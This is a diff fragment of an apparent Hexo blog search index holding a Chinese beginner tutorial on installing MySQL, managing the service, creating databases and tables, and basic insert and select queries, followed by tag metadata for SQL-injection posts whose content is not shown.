{“姓名”:”owl”,”年龄”:25,”班级”:”AID1803”,”班主任”:”小可爱”}</p></li></ol><h4 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a><strong>MySQL安装</strong></h4><ul><li>Ubuntu安装MySQL服务    RedHat(红帽),CentOS,Ubuntu</li></ul><ol><li><p>安装服务端</p><p> <code>sudo apt-get install mysql-server</code></p></li><li><p>安装客户端</p><p> <code>sudo apt-get install mysql-client</code></p></li></ol><ul><li>Windows安装MySQL安装包(Winodws)</li></ul><h4 id="启动和连接MySQL服务"><a href="#启动和连接MySQL服务" class="headerlink" title="启动和连接MySQL服务"></a><strong>启动和连接MySQL服务</strong></h4><p><strong>服务端启动</strong></p><ol><li>查看MySQL服务状态</li></ol><pre><code>sudo /etc/init.d/mysql status</code></pre><ol start="2"><li>停止,启动,重启MySQL服务</li></ol><pre><code>sudo /etc/init.d/mysql stop        #停止service mysql stopsudo /etc/init.d/mysql start    #启动service mysql startsudo /etc/init.d/mysql restart    #重启service mysql restart</code></pre><p><strong>客户端连接</strong></p><ol><li>命令格式</li></ol><pre><code>mysql -h主机地址 -u用户名 -p密码mysql -hlocalhost -uroot -p123456</code></pre><ol start="2"><li>本地连接可以省略 -h 选项</li></ol><pre><code>mysql -u用户名 -p密码mysql -uroot -p123456</code></pre><h4 id="基本MySQL命令"><a href="#基本MySQL命令" class="headerlink" title="基本MySQL命令"></a><strong>基本MySQL命令</strong></h4><ul><li>SQL命令的使用规则<ol><li>每条SQL命令必须以 <code>;</code> 结尾</li><li>SQL命令不区分字母大小写</li><li>使用 \c 来终止命令的执行(Linux中 ctrl+c)</li></ol></li></ul><h5 id="库的管理"><a href="#库的管理" class="headerlink" title="库的管理"></a><strong>库的管理</strong></h5><ul><li><p>库的基本操作</p><ol><li><p>查看已有的库</p><p> <code>show databases;</code></p></li><li><p>创建库(指定默认字符集)</p><p> <code>create database 库名 default charset=utf8;</code></p></li><li><p>查看创建库的语句</p><p> <code>show create database 库名;</code></p></li><li><p>查看当前所在库</p><p> <code>select database();</code></p></li><li><p>切换库</p><p> <code>use 库名;</code></p></li><li><p>查看库中已有表</p><p> <code>show tables;</code></p></li><li><p>删除库</p><p> <code>drop database 库名；</code></p></li></ol></li><li><p>库名的命名规则</p></li><li><p>可以使用数字,字母,_,但不能使用纯数字</p></li><li><p>库名区分字母大小写</p></li><li><p>库名具有唯一性</p></li><li><p>不能使用特殊字符和MySQL关键字</p></li></ul><h5 id="表的管理"><a href="#表的管理" class="headerlink" title="表的管理"></a><strong>表的管理</strong></h5><ul><li><p>表的基本操作</p><ol><li><p>创建表(指定字符集)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">字段名 数据类型,</span><br><span class="line">字段名 数据类型,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">create table t1(</span><br><span class="line">name char(20),</span><br><span class="line">age int,</span><br><span class="line">score int</span><br><span class="line">)default charset &#x3D; utf8;</span><br><span class="line"></span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure></li><li><p>查看创建表的语句(字符集)</p><p> <code>show create table 表名;</code></p></li><li><p>查看表结构</p><p> <code>desc 表名;</code></p></li><li><p>删除表</p><p> <code>drop table 表名;</code></p></li></ol></li><li><p>表的命名规则(同库的命名规则)</p></li></ul><p><strong>注意</strong></p><ol><li>所有的数据都是以文件的形式存放在数据库目录下</li><li>数据库目录: /var/lib/mysql</li></ol><p><strong>更改库,表的默认字符集</strong></p><ol><li>方法<br>通过更改MySQL服务的配置文件来实现</li><li>步骤 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo -i#获取root权限</span><br><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d#切换到配置文件所在路径</span><br><span class="line">cp mysql.cnf mysqld.cnf.bak#备份</span><br><span class="line">vi mysqld.cnf</span><br><span class="line">&#x2F;[mysqld]</span><br><span class="line">character_set_server &#x3D; utf8 #保存退出</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart#重启mysql服务</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql reload#重载配置文件,不重启</span><br><span class="line"></span><br><span class="line">#登录到MySQL验证</span><br><span class="line">mysql -uroot -p</span><br><span class="line">create database blackcat;</span><br><span class="line">show create database blackcat;</span><br></pre></td></tr></table></figure></li></ol><h5 id="表记录管理"><a href="#表记录管理" class="headerlink" title="表记录管理"></a><strong>表记录管理</strong></h5><ol><li>在表中插入纪录 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 values(值1),(值2),...,(值N);</span><br><span class="line">insert into t1 values(&quot;Tom&quot;,22,100);</span><br><span class="line">insert into t1 values(&quot;Green&quot;,25,88),(&quot;Lucy&quot;,23,99);</span><br><span class="line">insert into t1(name,age) values(&quot;Jim&quot;,28);</span><br></pre></td></tr></table></figure></li><li>查询表纪录 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br><span class="line">select 字段1,字段2,..字段名N from 表名;</span><br><span class="line">select name,score from t1;</span><br></pre></td></tr></table></figure></li></ol><h5 id="客户端把数据存储到数据库服务器的过程"><a href="#客户端把数据存储到数据库服务器的过程" class="headerlink" title="客户端把数据存储到数据库服务器的过程"></a><strong>客户端把数据存储到数据库服务器的过程</strong></h5><ol><li>连接到数据库服务器 mysql -uroot -p123456</li><li>选择一个库 <code>use 库名;</code></li><li>创建表或者修改表: <code>create ...</code></li><li>断开与数据库服务器的连接: <code>exit | quit | \q</code></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> DBS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>手动SQL注入</title>
       <link href="/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
       <url>/2014/05/04/Web_Attacks/SQL%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
@@ -1417,9 +1837,9 @@
             
             <tag> SQL注入 </tag>
             
-            <tag> Burpsuit </tag>
-            
             <tag> 联合查询 </tag>
+            
+            <tag> Burpsuit </tag>
             
         </tags>
       
@@ -1450,9 +1870,9 @@
             
             <tag> SQL注入 </tag>
             
-            <tag> SQL盲注 </tag>
-            
             <tag> Burpsuit </tag>
+            
+            <tag> SQL盲注 </tag>
             
         </tags>
       
